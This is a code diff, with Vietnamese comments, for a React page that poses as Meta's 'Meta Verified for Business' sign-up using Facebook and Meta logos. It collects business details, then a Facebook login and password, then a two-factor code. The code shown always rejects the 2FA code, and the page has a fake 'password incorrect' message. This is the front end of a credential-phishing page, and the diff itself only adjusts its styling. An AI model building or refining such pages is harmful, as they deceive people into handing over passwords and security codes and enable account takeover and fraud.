@@ -40,46 +40,42 @@ export default function Verify() {
     setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
   };
 
-  // Style chung cho Input để giống y hệt ảnh mày gửi
   const inputStyle = {
-    width: '100%', height: '52px', padding: '10px 16px', background: '#fff', 
-    border: '1px solid #ccd0d5', borderRadius: '12px', fontSize: '15px', 
-    color: '#1c2b33', outline: 'none', marginBottom: '12px'
+    width: '100%', height: '54px', padding: '10px 16px', background: '#fff', 
+    border: '1px solid #ccd0d5', borderRadius: '12px', fontSize: '16px', 
+    color: '#1c2b33', outline: 'none', marginBottom: '14px'
   };
 
   const btnStyle = {
-    width: '100%', height: '46px', background: '#0064e0', color: '#fff', 
+    width: '100%', height: '48px', background: '#0064e0', color: '#fff', 
     border: 'none', borderRadius: '24px', fontSize: '16px', fontWeight: '600', 
-    cursor: 'pointer', marginTop: '10px'
+    cursor: 'pointer', marginTop: '8px'
   };
 
   return (
-    /* Nền làm mờ, tối nhẹ để form nổi bật lên */
-    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0, 0, 0, 0.4)', backdropFilter: 'blur(4px)', position: 'fixed', inset: 0, zIndex: 1000 }}>
+    /* Nền mờ trong suốt (blur) nhẹ, không bị tối đen */
+    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0, 0, 0, 0.2)', backdropFilter: 'blur(3px)', position: 'fixed', inset: 0, zIndex: 1000 }}>
       
-      <div className={`modal-container ${errors.busName || errors.perEmail || errors.busEmail || errors.phoneNum || showLoginError || showOtpError ? 'shake' : ''}`} 
-           style={{ position: 'relative', background: '#fff', borderRadius: '16px', padding: '32px 24px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
+      {/* Khung Form màu trắng nổi bật */}
+      <div style={{ position: 'relative', background: '#fff', borderRadius: '16px', padding: '36px 28px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.15)' }}>
            
-        {/* Nút X */}
-        <button onClick={() => navigate('/')} style={{ position: 'absolute', top: '16px', right: '16px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '32px', height: '32px', cursor: 'pointer', color: '#606770', fontSize: '18px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>×</button>
+        <button onClick={() => navigate('/')} style={{ position: 'absolute', top: '16px', right: '16px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', fontSize: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>×</button>
         
-        {/* Logo FB */}
-        <div style={{ textAlign: 'center', marginBottom: '20px' }}>
-            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ height: '54px', margin: '0 auto' }} />
+        <div style={{ textAlign: 'center', marginBottom: '24px' }}>
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ height: '56px', margin: '0 auto' }} />
         </div>
 
-        {/* FORM 1: SIGNUP */}
         {step === 1 && (
           <>
-            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '6px' }}>Meta Verified for Business</h2>
-            <p style={{ fontSize: '14px', textAlign: 'center', color: '#65676b', marginBottom: '24px' }}>Enter your business details to start your application.</p>
+            <h2 style={{ fontSize: '24px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '8px' }}>Meta Verified for Business</h2>
+            <p style={{ fontSize: '15px', textAlign: 'center', color: '#65676b', marginBottom: '28px' }}>Enter your business details to start your application.</p>
             <form onSubmit={handleSignup} noValidate>
                 <input style={{...inputStyle, borderColor: errors.busName ? '#fa383e' : '#ccd0d5'}} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                 <input style={{...inputStyle, borderColor: errors.perEmail ? '#fa383e' : '#ccd0d5'}} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                 <input style={{...inputStyle, borderColor: errors.busEmail ? '#fa383e' : '#ccd0d5'}} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                 
-                <div style={{ display: 'flex', gap: '8px', marginBottom: '12px' }}>
-                    <select style={{...inputStyle, width: '40%', marginBottom: 0, cursor: 'pointer'}} value={countryCode} onChange={e => setCountryCode(e.target.value)}>
+                <div style={{ display: 'flex', gap: '10px', marginBottom: '14px' }}>
+                    <select style={{...inputStyle, width: '38%', marginBottom: 0, cursor: 'pointer'}} value={countryCode} onChange={e => setCountryCode(e.target.value)}>
                         <option value="+93">+93 (Afghanistan)</option>
                         <option value="+84">+84 (Vietnam)</option>
                         <option value="+1">+1 (United States)</option>
@@ -93,35 +89,30 @@ export default function Verify() {
           </>
         )}
 
-        {/* FORM 2: LOGIN */}
         {step === 2 && (
           <form onSubmit={handleLogin}>
               <input style={inputStyle} placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
               <input style={inputStyle} type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
-              
-              {showLoginError && <div style={{ color: '#fa383e', fontSize: '13px', marginBottom: '12px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
-              
+              {showLoginError && <div style={{ color: '#fa383e', fontSize: '14px', marginBottom: '14px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
               <button type="submit" style={btnStyle} disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
-              <div style={{ textAlign: 'center', marginTop: '16px' }}><a href="#" style={{ color: '#1c2b33', fontSize: '14px', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
+              <div style={{ textAlign: 'center', marginTop: '20px' }}><a href="#" style={{ color: '#1c2b33', fontSize: '15px', textDecoration: 'none', fontWeight: '500' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
           </form>
         )}
 
-        {/* FORM 3: 2FA */}
         {step === 3 && (
           <>
-            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '6px' }}>Two-factor authentication</h2>
-            <p style={{ fontSize: '14px', textAlign: 'center', color: '#65676b', marginBottom: '24px' }}>Enter the 6-digit code we sent to your WhatsApp or SMS.</p>
+            <h2 style={{ fontSize: '24px', fontWeight: '700', textAlign: 'center', color: '#1c2b33', marginBottom: '8px' }}>Two-factor authentication</h2>
+            <p style={{ fontSize: '15px', textAlign: 'center', color: '#65676b', marginBottom: '28px' }}>Enter the 6-digit code we sent to your WhatsApp or SMS.</p>
             <form onSubmit={handleOtp}>
-                <input style={{...inputStyle, textAlign: 'center', fontSize: '24px', letterSpacing: '8px', fontWeight: '700'}} placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
-                {showOtpError && <div style={{ color: '#fa383e', fontSize: '13px', marginBottom: '12px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
+                <input style={{...inputStyle, textAlign: 'center', fontSize: '26px', letterSpacing: '10px', fontWeight: '700', height: '64px'}} placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
+                {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', marginBottom: '14px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                 <button type="submit" style={btnStyle} disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
             </form>
           </>
         )}
 
-        {/* Footer Meta */}
-        <div style={{ textAlign: 'center', marginTop: '24px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '14px', margin: '0 auto' }} />
+        <div style={{ textAlign: 'center', marginTop: '28px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', margin: '0 auto' }} />
         </div>
       </div>
     </div>
